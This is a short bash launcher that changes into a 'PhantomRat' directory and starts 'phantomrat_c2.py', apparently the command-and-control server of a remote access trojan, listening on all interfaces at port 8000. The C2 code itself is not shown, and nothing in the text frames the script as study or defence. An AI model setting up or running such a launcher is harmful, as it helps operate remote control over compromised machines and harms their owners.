#!/bin/bash
cd /home/sysmaint/PhantomRat
source /home/sysmaint/.bashrc
export PYTHONPATH=/home/sysmaint/.local/lib/python3.10/site-packages:$PYTHONPATH
exec /usr/bin/python3 phantomrat_c2.py -i 0.0.0.0 -p 8000
